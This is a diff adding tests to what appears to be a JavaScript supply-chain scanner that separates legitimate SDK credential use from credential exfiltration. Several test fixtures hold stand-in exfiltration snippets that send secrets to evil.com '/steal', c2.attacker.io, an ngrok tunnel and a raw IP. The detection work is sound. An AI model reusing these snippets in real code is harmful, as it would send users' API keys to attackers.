@@ -4,9 +4,10 @@ const path = require('path');
 const os = require('os');
 const fs = require('fs');
 const { test, asyncTest, assert, assertIncludes, runScanDirect, addSkipped } = require('../test-utils');
-const { classifySource, classifySink, buildIntentPairs, COHERENCE_MATRIX } = require('../../src/intent-graph.js');
+const { classifySource, classifySink, buildIntentPairs, COHERENCE_MATRIX, isSDKPattern, extractEnvVarFromMessage, extractBrandFromEnvVar, SDK_ENV_DOMAIN_MAP } = require('../../src/intent-graph.js');
 
 const ADVERSARIAL_DIR = path.join(__dirname, '..', '..', 'datasets', 'adversarial');
+const INTENT_SAMPLES_DIR = path.join(__dirname, '..', 'samples', 'intent-graph');
 
 async function runIntentGraphTests() {
   // =========================================================================
@@ -348,6 +349,177 @@ async function runIntentGraphTests() {
     ];
     const result = buildIntentPairs(threats);
     assert(result.intentScore === 0, `env_access(NODE_ENV) should not produce intent pair, got ${result.intentScore}`);
+  });
+
+  // =========================================================================
+  // Unit tests: extractEnvVarFromMessage
+  // =========================================================================
+
+  test('INTENT: extractEnvVarFromMessage — process.env.SALESFORCE_API_KEY', () => {
+    const threats = [{ message: 'process.env.SALESFORCE_API_KEY accessed' }];
+    const result = extractEnvVarFromMessage(threats);
+    assert(result === 'SALESFORCE_API_KEY', `Expected SALESFORCE_API_KEY, got ${result}`);
+  });
+
+  test('INTENT: extractEnvVarFromMessage — standalone var name', () => {
+    const threats = [{ message: 'env var MAILGUN_API_KEY detected in code' }];
+    const result = extractEnvVarFromMessage(threats);
+    assert(result === 'MAILGUN_API_KEY', `Expected MAILGUN_API_KEY, got ${result}`);
+  });
+
+  test('INTENT: extractEnvVarFromMessage — no env var in message', () => {
+    const threats = [{ message: '.npmrc file read detected' }];
+    const result = extractEnvVarFromMessage(threats);
+    assert(result === null, `Expected null for non-env message, got ${result}`);
+  });
+
+  // =========================================================================
+  // Unit tests: extractBrandFromEnvVar
+  // =========================================================================
+
+  test('INTENT: extractBrandFromEnvVar — MAILGUN_API_KEY → MAILGUN', () => {
+    assert(extractBrandFromEnvVar('MAILGUN_API_KEY') === 'MAILGUN', 'Should extract MAILGUN');
+  });
+
+  test('INTENT: extractBrandFromEnvVar — SALESFORCE_CLIENT_SECRET → SALESFORCE', () => {
+    assert(extractBrandFromEnvVar('SALESFORCE_CLIENT_SECRET') === 'SALESFORCE', 'Should extract SALESFORCE');
+  });
+
+  test('INTENT: extractBrandFromEnvVar — API_KEY → null (all noise tokens)', () => {
+    assert(extractBrandFromEnvVar('API_KEY') === null, 'Should return null for all-noise tokens');
+  });
+
+  // =========================================================================
+  // Unit tests: isSDKPattern
+  // =========================================================================
+
+  test('INTENT: isSDKPattern — SALESFORCE_API_KEY + salesforce.com → true', () => {
+    const content = 'const url = "https://login.salesforce.com/services/oauth2/token";';
+    assert(isSDKPattern('SALESFORCE_API_KEY', content) === true, 'Salesforce SDK should match');
+  });
+
+  test('INTENT: isSDKPattern — MAILGUN_API_KEY + mailgun.net → true', () => {
+    const content = 'fetch("https://api.mailgun.net/v3/messages", { headers: {} })';
+    assert(isSDKPattern('MAILGUN_API_KEY', content) === true, 'Mailgun SDK should match');
+  });
+
+  test('INTENT: isSDKPattern — STRIPE_SECRET_KEY + stripe.com → true', () => {
+    const content = 'const res = await fetch("https://api.stripe.com/v1/charges");';
+    assert(isSDKPattern('STRIPE_SECRET_KEY', content) === true, 'Stripe SDK should match');
+  });
+
+  test('INTENT: isSDKPattern — MAILGUN_API_KEY + evil.com → false (domain mismatch)', () => {
+    const content = 'https.request({ hostname: "evil.com", path: "/steal" })';
+    assert(isSDKPattern('MAILGUN_API_KEY', content) === false, 'Mismatch domain should not match');
+  });
+
+  test('INTENT: isSDKPattern — STRIPE_SECRET_KEY + stripe.com + evil.com → false (dual exfil)', () => {
+    const content = `
+      fetch("https://api.stripe.com/v1/charges");
+      fetch("https://c2.attacker.io/keys");
+    `;
+    assert(isSDKPattern('STRIPE_SECRET_KEY', content) === false, 'Dual exfil should not match');
+  });
+
+  test('INTENT: isSDKPattern — no URLs in file → false (default suspicious)', () => {
+    const content = 'const key = process.env.STRIPE_SECRET_KEY; doSomething(key);';
+    assert(isSDKPattern('STRIPE_SECRET_KEY', content) === false, 'No URLs should default to suspicious');
+  });
+
+  test('INTENT: isSDKPattern — ngrok tunnel domain → false (tunneling)', () => {
+    const content = 'fetch("https://abc123.ngrok.io/api/data");';
+    assert(isSDKPattern('STRIPE_SECRET_KEY', content) === false, 'ngrok should be blocked');
+  });
+
+  test('INTENT: isSDKPattern — raw IP address → false', () => {
+    const content = 'fetch("https://192.168.1.100/exfil");';
+    assert(isSDKPattern('STRIPE_SECRET_KEY', content) === false, 'Raw IP should be blocked');
+  });
+
+  test('INTENT: isSDKPattern — heuristic fallback: ACME_API_KEY + api.acme.com → true', () => {
+    const content = 'fetch("https://api.acme.com/v1/resource");';
+    assert(isSDKPattern('ACME_API_KEY', content) === true, 'Heuristic brand match should work');
+  });
+
+  test('INTENT: isSDKPattern — heuristic: ACME_API_KEY + acmetech.com → false (substring, not label)', () => {
+    const content = 'fetch("https://api.acmetech.com/v1/resource");';
+    assert(isSDKPattern('ACME_API_KEY', content) === false, 'Substring match should not work');
+  });
+
+  test('INTENT: isSDKPattern — domain mimicry: api-mailgun.evil.com → false', () => {
+    const content = 'fetch("https://api-mailgun.evil.com/steal");';
+    assert(isSDKPattern('MAILGUN_API_KEY', content) === false, 'Domain mimicry should fail (suffix mismatch)');
+  });
+
+  // =========================================================================
+  // Unit tests: SDK_ENV_DOMAIN_MAP coverage
+  // =========================================================================
+
+  test('INTENT: SDK_ENV_DOMAIN_MAP has 22 entries', () => {
+    assert(SDK_ENV_DOMAIN_MAP.length === 22, `Expected 22 SDK mappings, got ${SDK_ENV_DOMAIN_MAP.length}`);
+  });
+
+  // =========================================================================
+  // Integration: buildIntentPairs with targetPath (SDK detection)
+  // =========================================================================
+
+  test('INTENT: buildIntentPairs with SDK fixture — salesforce → no intent threat', () => {
+    const threats = [
+      { type: 'env_access', severity: 'HIGH', message: 'process.env.SALESFORCE_API_KEY', file: 'sdk-salesforce.js' },
+      { type: 'suspicious_dataflow', severity: 'CRITICAL', message: 'calls https.request to external host', file: 'sdk-salesforce.js' }
+    ];
+    // suspicious_dataflow is excluded as source, and env_access with SALESFORCE_API_KEY → credential_read
+    // The sink is from message pattern matching
+    const threats2 = [
+      { type: 'env_access', severity: 'HIGH', message: 'process.env.SALESFORCE_API_KEY', file: 'sdk-salesforce.js' },
+      { type: 'prototype_hook', severity: 'HIGH', message: 'calls https.request to external host', file: 'sdk-salesforce.js' }
+    ];
+    const result = buildIntentPairs(threats2, INTENT_SAMPLES_DIR);
+    assert(result.intentThreats.length === 0,
+      `SDK Salesforce should produce no intent threats, got ${result.intentThreats.length}`);
+  });
+
+  test('INTENT: buildIntentPairs with mismatch fixture — MAILGUN + evil.com → intent threat', () => {
+    const threats = [
+      { type: 'env_access', severity: 'HIGH', message: 'process.env.MAILGUN_API_KEY', file: 'sdk-mismatch.js' },
+      { type: 'prototype_hook', severity: 'HIGH', message: 'calls https.request to external host', file: 'sdk-mismatch.js' }
+    ];
+    const result = buildIntentPairs(threats, INTENT_SAMPLES_DIR);
+    // credential_read → network_external, domain mismatch → CRITICAL pair
+    const credNetPair = result.pairs.find(p => p.sourceType === 'credential_read' && p.sinkType === 'network_external');
+    assert(credNetPair, 'Mismatch should produce credential_read → network_external pair');
+  });
+
+  test('INTENT: buildIntentPairs with dual-exfil fixture — stripe + evil → intent threat', () => {
+    const threats = [
+      { type: 'env_access', severity: 'HIGH', message: 'process.env.STRIPE_SECRET_KEY', file: 'sdk-evil-dual.js' },
+      { type: 'prototype_hook', severity: 'HIGH', message: 'calls https.request to external host', file: 'sdk-evil-dual.js' }
+    ];
+    const result = buildIntentPairs(threats, INTENT_SAMPLES_DIR);
+    const credNetPair = result.pairs.find(p => p.sourceType === 'credential_read' && p.sinkType === 'network_external');
+    assert(credNetPair, 'Dual exfil should still produce credential_read → network_external pair');
+  });
+
+  test('INTENT: buildIntentPairs without targetPath — backward compat, no SDK check', () => {
+    const threats = [
+      { type: 'env_access', severity: 'HIGH', message: 'process.env.SALESFORCE_API_KEY', file: 'sdk-salesforce.js' },
+      { type: 'prototype_hook', severity: 'HIGH', message: 'calls https.request to external host', file: 'sdk-salesforce.js' }
+    ];
+    const result = buildIntentPairs(threats);
+    // Without targetPath, SDK check is skipped → pair should be created
+    const credNetPair = result.pairs.find(p => p.sourceType === 'credential_read' && p.sinkType === 'network_external');
+    assert(credNetPair, 'Without targetPath, SDK check should be skipped');
+  });
+
+  test('INTENT: buildIntentPairs — exec_sink pair NOT affected by SDK check', () => {
+    // SDK check only applies to credential_read → network_external
+    const threats = [
+      { type: 'sensitive_string', severity: 'HIGH', message: '.npmrc detected', file: 'sdk-salesforce.js' },
+      { type: 'dangerous_call_eval', severity: 'CRITICAL', message: 'eval() called', file: 'sdk-salesforce.js' }
+    ];
+    const result = buildIntentPairs(threats, INTENT_SAMPLES_DIR);
+    const credExec = result.pairs.find(p => p.sourceType === 'credential_read' && p.sinkType === 'exec_sink');
+    assert(credExec, 'credential_read → exec_sink should NOT be affected by SDK check');
   });
 }
 
